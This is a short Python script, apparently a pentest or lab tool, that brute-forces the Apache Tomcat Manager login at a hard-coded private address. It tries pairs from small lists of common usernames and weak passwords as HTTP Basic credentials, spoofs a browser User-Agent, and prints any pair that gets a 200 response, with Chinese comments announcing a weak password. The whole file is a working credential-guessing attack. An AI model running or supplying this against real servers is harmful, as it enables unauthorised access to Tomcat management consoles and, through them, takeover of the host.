#!/usr/bin/env python

import requests
import base64

url = 'http://172.30.230.107:8080/manager/html'

def tomcat_weak_password(url):
    users = ['tomcat','admin','system','Administrator','root','123','tomcat']
    passwords = ['12345','123','tomcat','admin','00000','tomcat']
    for user in users:
        for password in passwords:
            # print('正在测试账号： ',user)
            # print('正在测试密码： ', password)
            tomcat_passwd = user.strip()+':'+password.strip()
            #base64编码
            encoded_password = base64.b64encode(tomcat_passwd.encode('utf-8'))
            encoded_password_end = 'Basic '+str(encoded_password,'utf-8')
            # print(encoded_password_end)
            headers = {
                'Content-Type': 'application/x-www',
                'Authorization':encoded_password_end,
                # 'Authorization': 'Basic dG9tY2F0OnRvbWNhdA==',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36'
                       }
            response = requests.get(url, headers=headers)
            # print(response.status_code)
            if response.status_code == 200:
                print('存在弱口令')
                print('账号',user)
                print('密码',password)
                break
            # else:
            #     print('不存在弱口令')



tomcat_weak_password(url);